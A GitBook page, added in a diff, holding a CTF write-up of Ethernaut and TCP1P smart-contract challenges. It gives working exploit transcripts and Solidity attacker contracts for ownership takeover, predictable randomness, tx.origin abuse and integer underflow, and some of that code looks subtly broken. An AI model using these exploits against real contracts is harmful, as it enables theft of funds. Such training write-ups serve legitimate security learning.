@@ -1,0 +1,961 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Ethernaut · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="羊城杯 2023 web writeup.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            <br />
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    About This Site
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="Ethernaut.html">
+            
+                <a href="Ethernaut.html#231012">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="羊城杯 2023 web writeup.html">
+            
+                <a href="羊城杯 2023 web writeup.html#20230903">
+            
+                    
+                    羊城杯 2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="webacademy XSS.html">
+            
+                <a href="webacademy XSS.html#20230829">
+            
+                    
+                    webacademy XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="WMCTF 2023 web writeup.html">
+            
+                <a href="WMCTF 2023 web writeup.html#20230824">
+            
+                    
+                    WMCTF2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="Racing and Smashing the state machine.html">
+            
+                <a href="Racing and Smashing the state machine.html#20230817">
+            
+                    
+                    Racing and Smashing the state machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="ioredis源码阅读.html">
+            
+                <a href="ioredis源码阅读.html#20230718">
+            
+                    
+                    ioredis源码阅读
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="Gandalf AI challenge.html">
+            
+                <a href="Gandalf AI challenge.html#20230707">
+            
+                    
+                    Gandalf AI challenge
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="NSSCTF challenges.html">
+            
+                <a href="NSSCTF challenges.html#20230605">
+            
+                    
+                    NSSCTF challenges
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="JS 的一些特性：原型链，作用域，闭包.html">
+            
+                <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117">
+            
+                    
+                    JS 的一些特性：原型链，作用域，闭包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="CBCTF-0RAYS协会招新.html">
+            
+                <a href="CBCTF-0RAYS协会招新.html#20221212">
+            
+                    
+                    CBCTF-0RAYS协会招新
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="utils&memo.html">
+            
+                <a href="utils&memo.html#20230423">
+            
+                    
+                    utils&memo
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="#" target="blank" class="gitbook-link">
+            <!-- Published with GitBook -->Powered By Gitbook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >Ethernaut</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p>Online game <a href="https://ethernaut.openzeppelin.com/" target="_blank">Ethernaut</a>, Using SepoliaETH from <a href="https://sepolia-faucet.pk910.de/#/" target="_blank">mining faucet</a>.</p>
+<h2 id="hello-ethernaut">Hello Ethernaut</h2>
+<p>Interact with contracts to complete challenges</p>
+<pre><code class="lang-js">&gt; <span class="hljs-keyword">await</span> contract.info()
+&lt; <span class="hljs-string">&apos;You will find what you need in info1().&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.info1()
+&lt; <span class="hljs-string">&apos;You will find what you need in info2().&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.info2()
+&lt; <span class="hljs-string">&apos;The property infoNum holds the number of the next info method to call.&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.infoNum()
+&lt; {words: [<span class="hljs-number">42</span>]}
+&gt; <span class="hljs-keyword">await</span> contract.info42()
+&lt;<span class="hljs-string">&apos;theMethodName is the name of the next method.&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.theMethodName()
+&lt; <span class="hljs-string">&apos;The method name is method7123949.&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.method7123949()
+&lt;<span class="hljs-string">&apos;If you know the password, submit it to authenticate().&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.password()
+&lt;<span class="hljs-string">&apos;ethernaut0&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.authenticate(<span class="hljs-string">&apos;ethernaut0&apos;</span>)
+</code></pre>
+<p>solidity source:</p>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Instance {
+
+  string public password;
+  uint8 public infoNum = 42;
+  string public theMethodName = &apos;The method name is method7123949.&apos;;
+  bool private cleared = false;
+
+  // constructor
+  constructor(string memory _password) {
+    password = _password;
+  }
+
+  function info() public pure returns (string memory) {
+    return &apos;You will find what you need in info1().&apos;;
+  }
+
+  function info1() public pure returns (string memory) {
+    return &apos;Try info2(), but with &quot;hello&quot; as a parameter.&apos;;
+  }
+
+  function info2(string memory param) public pure returns (string memory) {
+    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&apos;hello&apos;))) {
+      return &apos;The property infoNum holds the number of the next info method to call.&apos;;
+    }
+    return &apos;Wrong parameter.&apos;;
+  }
+
+  function info42() public pure returns (string memory) {
+    return &apos;theMethodName is the name of the next method.&apos;;
+  }
+
+  function method7123949() public pure returns (string memory) {
+    return &apos;If you know the password, submit it to authenticate().&apos;;
+  }
+
+  function authenticate(string memory passkey) public {
+    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
+      cleared = true;
+    }
+  }
+
+  function getCleared() public view returns (bool) {
+    return cleared;
+  }
+}
+</code></pre>
+<h2 id="fallback">Fallback</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+
+  mapping(address =&gt; uint) public contributions;
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            &quot;caller is not the owner&quot;
+        );
+        _;
+    }
+
+  function contribute() public payable {
+    require(msg.value &lt; 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] &gt; contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    payable(owner).transfer(address(this).balance);
+  }
+
+  receive() external payable {
+    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+    owner = msg.sender;
+  }
+}
+</code></pre>
+<p>There are two function could be used claim ownership of the contract. Since the original owner have 1000 wei in wallet, the function <code>contribute()</code>was hard to exploit. But requirement of <code>receive()</code>could easily be satisfied by using <code>contribute()</code>.</p>
+<pre><code class="lang-js"><span class="hljs-comment">// need to refer to the API documentation of web3.js https://web3js.readthedocs.io/en/v1.10.0/</span>
+&gt; <span class="hljs-keyword">await</span> contract.contribute.sendTransaction({<span class="hljs-keyword">from</span>: player, value: toWei(<span class="hljs-string">&apos;0.0009&apos;</span>)})
+&lt; {tx: <span class="hljs-string">&apos;0x8868e98a26a35a88c57d2cadf24f40fb505a8b18b9bc047b9ca307fea4964068&apos;</span>, receipt: {&#x2026;}, logs: <span class="hljs-built_in">Array</span>(<span class="hljs-number">0</span>)}
+&gt; <span class="hljs-keyword">await</span> sendTransaction({<span class="hljs-keyword">from</span>: player, to: contract.address, value: toWei(<span class="hljs-string">&apos;0.00001&apos;</span>)})
+&lt; <span class="hljs-string">&apos;0x4f13c20bdb389b3901633d1665c466f48795f3e05f0a31e68f57135b512333e5&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.owner()
+&lt; <span class="hljs-string">&apos;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&apos;</span>
+&gt; player
+&lt; <span class="hljs-string">&apos;0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9&apos;</span>
+&gt; <span class="hljs-keyword">await</span> contract.withdraw.sendTransaction()
+&lt; {tx: <span class="hljs-string">&apos;0x0eea3783ce911fb2c7fda42b5f44f60b63c1b6f1e862a7e463bbd6469e592320&apos;</span>, receipt: {&#x2026;}, logs: <span class="hljs-built_in">Array</span>(<span class="hljs-number">0</span>)}
+&gt; <span class="hljs-keyword">await</span> web3.eth.getBalance(contract.address)
+&lt; <span class="hljs-string">&apos;0&apos;</span>
+</code></pre>
+<h2 id="fallout">Fallout</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import &apos;openzeppelin-contracts-06/math/SafeMath.sol&apos;;
+
+contract Fallout {
+
+  using SafeMath for uint256;
+  mapping (address =&gt; uint) allocations;
+  address payable public owner;
+
+
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+  modifier onlyOwner {
+            require(
+                msg.sender == owner,
+                &quot;caller is not the owner&quot;
+            );
+            _;
+        }
+
+  function allocate() public payable {
+    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+  }
+
+  function sendAllocation(address payable allocator) public {
+    require(allocations[allocator] &gt; 0);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  function collectAllocations() public onlyOwner {
+    msg.sender.transfer(address(this).balance);
+  }
+
+  function allocatorBalance(address allocator) public view returns (uint) {
+    return allocations[allocator];
+  }
+}
+</code></pre>
+<p>In early version of solidity, the function with the same name as the contract was used as the constructor. Wrong spelling of word <code>Fallout</code> causes <code>owner</code> variable to be uninitialized and can be called externally for assignment. Reference <a href="https://docs.soliditylang.org/en/v0.8.21/050-breaking-changes.html#constructors" target="_blank">https://docs.soliditylang.org/en/v0.8.21/050-breaking-changes.html#constructors</a></p>
+<pre><code class="lang-js">&gt; <span class="hljs-keyword">await</span> contract.Fal1out.sendTransaction()
+&lt; {tx: <span class="hljs-string">&apos;0xca9b301bac18f13c460eb71103e972efbe08bc07821a322945b947e629aa445d&apos;</span>, receipt: {&#x2026;}, logs: <span class="hljs-built_in">Array</span>(<span class="hljs-number">0</span>)}
+&gt; <span class="hljs-keyword">await</span> contract.owner() == player
+&lt; <span class="hljs-literal">true</span>
+</code></pre>
+<h2 id="coin-flip">Coin Flip</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+</code></pre>
+<p>The target is to increase consistentWins to 10, which is the value of successfully guess the <code>side</code> variable ten times in a row.</p>
+<p>Observing the generation logic of the side variable, easily know that this is a pseudo-random number generation method. This means that we can predict this result in the attacker&apos;s contract.</p>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+import &apos;./SafeMath.sol&apos;; // https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
+import &apos;./coinflip.sol&apos;; // challenge source code
+
+contract Attacker{
+
+    using SafeMath for uint256;
+    CoinFlip public coinFlipContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _coinFlipContract) {
+        coinFlipContract = CoinFlip(_coinFlipContract);
+    }
+    function guessFlip() public {
+
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool guess = coinFlip == 1 ? true : false;
+
+        coinFlipContract.flip(guess);
+    }
+}
+</code></pre>
+<h2 id="telephone">Telephone</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+</code></pre>
+<p>For claiming ownership of the contract, just need to make the values of <code>tx.origin</code> and <code>msg.sender</code> unequal. Reference to <a href="https://docs.soliditylang.org/en/v0.8.21/cheatsheet.html#block-and-transaction-properties" target="_blank">https://docs.soliditylang.org/en/v0.8.21/cheatsheet.html#block-and-transaction-properties</a>, <code>msg.sender</code> would return address of sender of the message (current call) while <code>tx.origin</code> return the address of sender of the transaction (full call chain), which mean the <code>tx.origin</code> must be a <code>Externally Owned Account</code> and <code>msg.sender</code> could be a <code>contract account</code> used for indirect calls. </p>
+<p>Just deploy a contract for indirectly calling would satisfied the requirements.</p>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &apos;./Telephone.sol&apos;;
+
+contract Attacker {
+  Telephone _telephone;
+  constructor(address _address) {
+    _telephone = new Telephone(_address);
+  }
+  function IndirectlyCall() {
+    _telephone.changeOwner(msg.sender);
+  }
+}
+</code></pre>
+<h2 id="token">Token</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address =&gt; uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value &gt;= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+</code></pre>
+<p>Easily noticed that the requirement <code>balances[msg.sender] - _value &gt;= 0</code> doesn&apos;t use SafeMath.sol, leading to overflow vulnerability. It is because <code>balances[msg.sender]</code> and <code>_value</code> was all declared as <code>uint</code>, and the result of the calculation will still be uint.</p>
+<p>To solve this challenge, we need another account to call the transfer. Because both EOA and CA are applicable, just modify the Attacker contract in the former challenge <code>Telephone</code>, this challenge can be solved.</p>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import &apos;./Token.sol&apos;;
+
+contract Attacker {
+  Token _token;
+  constructor(address _address) {
+    _token = Token(_address);
+  }
+  function IndirectlyCall(address _address) public {
+    _token.transfer(_address, 10000020);
+  }
+}
+</code></pre>
+<h2 id="delegation">Delegation</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+</code></pre>
+<h2 id="tcp1p-venue">TCP1P Venue</h2>
+<pre><code class="lang-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+contract Venue{
+    string private flag;
+    string private message;
+
+    constructor(string memory initialFlag, string memory initialMessage){
+        flag = initialFlag;
+        message = initialMessage;
+    }
+
+    function enterVenue() public view returns(string memory){
+        return flag;
+    }
+
+    function goBack() public view returns(string memory){
+        return message;
+    }
+}
+</code></pre>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3
+
+<span class="hljs-comment"># Instantiate the web3 object and specify the HTTP provider</span>
+w3 = Web3(Web3.HTTPProvider(<span class="hljs-string">&apos;https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8&apos;</span>))
+
+<span class="hljs-comment"># print(w3.eth.get_block(&apos;latest&apos;))</span>
+
+<span class="hljs-comment"># compiled in remix</span>
+abi = [
+    {
+        <span class="hljs-string">&quot;inputs&quot;</span>: [
+            {
+                <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;initialFlag&quot;</span>,
+                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>
+            },
+            {
+                <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;initialMessage&quot;</span>,
+                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>
+            }
+        ],
+        <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;nonpayable&quot;</span>,
+        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;constructor&quot;</span>
+    },
+    {
+        <span class="hljs-string">&quot;inputs&quot;</span>: [],
+        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;enterVenue&quot;</span>,
+        <span class="hljs-string">&quot;outputs&quot;</span>: [
+            {
+                <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>
+            }
+        ],
+        <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,
+        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>
+    },
+    {
+        <span class="hljs-string">&quot;inputs&quot;</span>: [],
+        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;goBack&quot;</span>,
+        <span class="hljs-string">&quot;outputs&quot;</span>: [
+            {
+                <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,
+                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>
+            }
+        ],
+        <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,
+        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>
+    }
+]
+
+<span class="hljs-comment"># contract address</span>
+address = <span class="hljs-string">&apos;0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3&apos;</span>
+
+contract_instance = w3.eth.contract(address=address, abi=abi)
+
+func = getattr(contract_instance.functions, <span class="hljs-string">&apos;enterVenue&apos;</span>)()
+flag = func.call()
+print(f<span class="hljs-string">&quot;flag: {flag}&quot;</span>)
+
+<span class="hljs-comment"># TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}</span>
+</code></pre>
+<h2 id="tcp1p-location">TCP1P Location</h2>
+<pre><code class="lang-bash">====Going to The Party====
+
+To Find the party location
+You need to solve a simple riddle regarding a SLOT
+Answer everything correctly, and find the exact location!
+
+Question: In <span class="hljs-built_in">which</span> Slot is Password Stored?
+
+You<span class="hljs-string">&apos;ll answer with and ONLY WITH [numbers]
+ex: 
+0,1,2,3,4.....99
+
+Note: 
+    -   Slot start from 0
+    -   If it doesn&apos;</span>t stored on SLOT, answer 0
+
+Identification Required <span class="hljs-keyword">for</span> Guest
+
+Question:
+
+contract StorageChallenge7 {
+    bytes32 private key;
+    bytes4 private key_1;
+    bytes16 private key_2;
+    address private owner;
+    uint256 private Token;
+    address private immutable Investor;
+    address private Courier;
+    bytes32 private immuatble password;
+}
+
+Answer:
+</code></pre>
+<p>Apparently a question about EVM. </p>
+<pre><code class="lang-py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> re
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_contract_content</span><span class="hljs-params">(stream: bytes)</span>:</span>
+    pattern = <span class="hljs-string">r&quot;\{([^}]+)\}&quot;</span>
+    match = re.search(pattern, stream.decode())
+    <span class="hljs-keyword">if</span> match:
+        <span class="hljs-keyword">return</span> match.group(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">raise</span> Exception(stream.decode())
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_type_array_till_pwd</span><span class="hljs-params">(content: string)</span>:</span>
+    line_array = content.split(<span class="hljs-string">&apos;\n&apos;</span>)
+    type_array = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(line_array)):
+        <span class="hljs-keyword">if</span> line_array[i] <span class="hljs-keyword">and</span> <span class="hljs-string">&apos;immutable&apos;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line_array[i]:
+            type_array.append(line_array[i][<span class="hljs-number">4</span>:].split(<span class="hljs-string">&apos; &apos;</span>)[<span class="hljs-number">0</span>])
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;immutable password&apos;</span> <span class="hljs-keyword">in</span> line_array[i]:
+            <span class="hljs-keyword">return</span> [<span class="hljs-string">&apos;bool&apos;</span>]
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos; password;&apos;</span> <span class="hljs-keyword">in</span> line_array[i]:
+            <span class="hljs-keyword">return</span> type_array
+    <span class="hljs-keyword">raise</span> Exception(content)
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
+
+
+<span class="hljs-comment"># References to https://www.8btc.com/article/6693684 (Chinese)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_slot_number_by_type_array</span><span class="hljs-params">(type_array: list)</span>:</span>
+
+    slot_number = <span class="hljs-number">0</span>
+    current_slot_height = <span class="hljs-number">0</span>
+
+
+    <span class="hljs-keyword">for</span> type <span class="hljs-keyword">in</span> type_array:
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;[&apos;</span> <span class="hljs-keyword">in</span> type:
+            <span class="hljs-keyword">if</span> current_slot_height &gt; <span class="hljs-number">0</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">0</span>
+            slot_number += int(re.search(<span class="hljs-string">r&quot;\[([^[\]]+)\]&quot;</span>, type).group(<span class="hljs-number">1</span>))
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;bytes32&apos;</span>, <span class="hljs-string">&apos;uint256&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &gt; <span class="hljs-number">0</span>:
+                slot_number += <span class="hljs-number">2</span>
+                current_slot_height = <span class="hljs-number">0</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">0</span>
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;address&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &lt;= <span class="hljs-number">12</span>:
+                current_slot_height += <span class="hljs-number">20</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">20</span>
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;bytes16&apos;</span>, <span class="hljs-string">&apos;uint128&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &lt;= <span class="hljs-number">16</span>:
+                current_slot_height += <span class="hljs-number">16</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">16</span>
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;bytes8&apos;</span>, <span class="hljs-string">&apos;uint64&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &lt;= <span class="hljs-number">24</span>:
+                current_slot_height += <span class="hljs-number">8</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">8</span>
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;bytes4&apos;</span>, <span class="hljs-string">&apos;uint32&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &lt;= <span class="hljs-number">28</span>:
+                current_slot_height += <span class="hljs-number">4</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">4</span>
+
+        <span class="hljs-keyword">if</span> type <span class="hljs-keyword">in</span> [<span class="hljs-string">&apos;bool&apos;</span>]:
+            <span class="hljs-keyword">if</span> current_slot_height &lt;= <span class="hljs-number">31</span>:
+                current_slot_height += <span class="hljs-number">1</span>
+            <span class="hljs-keyword">else</span>:
+                slot_number += <span class="hljs-number">1</span>
+                current_slot_height = <span class="hljs-number">1</span>
+
+    <span class="hljs-keyword">if</span> current_slot_height == <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">return</span> slot_number - <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> slot_number
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    conn = remote(<span class="hljs-string">&apos;ctf.tcp1p.com&apos;</span>, <span class="hljs-string">&apos;20005&apos;</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">11</span>):
+        recvd = conn.recvuntil(<span class="hljs-string">b&apos;Answer: &apos;</span>, drop=<span class="hljs-keyword">False</span>)
+        print(get_contract_content(recvd))
+        print(get_type_array_till_pwd(get_contract_content(recvd)))
+        answer = get_slot_number_by_type_array(get_type_array_till_pwd(get_contract_content(recvd)))
+        print(answer)
+        conn.sendline(str(answer).encode())
+        print(<span class="hljs-string">&apos;-------------------------------------------------------------------\n&apos;</span>)
+
+    output = conn.recvall()
+    print(output.decode())
+
+<span class="hljs-comment"># TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc}</span>
+</code></pre>
+<h2 id="tcp1p-vip">TCP1P VIP</h2>
+<pre><code class="lang-bash">Welcome to TCP1P Blockchain Challenge
+
+1. How to 101?
+2. get Contract
+&gt;&gt; 2
+Contract Addess: 0xFC5C0e4845ebb6fedcB57c17A09BFC77BE4e1478
+RPC URL        : https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+To start       : Simply call the <span class="hljs-built_in">help</span>() <span class="hljs-keyword">function</span>, everything is written there
+
+Note: Due it<span class="hljs-string">&apos;s deployed on Sepolia network, please use your own Private key to do the transaction
+      If you need funds, you can either DM the probset or get it on https://sepoliafaucet.com/
+</span></code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
